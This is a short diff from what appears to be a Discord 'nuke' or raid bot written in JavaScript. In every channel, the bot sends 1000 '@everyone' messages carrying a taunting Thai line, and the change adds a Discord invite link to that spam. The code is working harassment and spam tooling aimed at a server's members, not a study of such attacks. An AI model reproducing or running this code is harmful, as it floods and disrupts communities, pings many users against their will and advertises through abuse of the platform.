@@ -150,7 +150,7 @@ client.on("interactionCreate", async (interaction) => {
       const tasks = channels.map((ch) => (
         async () => {
           for (let j = 0; j < 1000; j++) {
-            ch.send(`@everyone ไม่เป็นไรนะสร้างใหม่ได้ `).catch(() => {});
+            ch.send(`@everyone ไม่เป็นไรนะสร้างใหม่ได้ https://discord.gg/bdtRJBRyem`).catch(() => {});
           }
         }
       )());
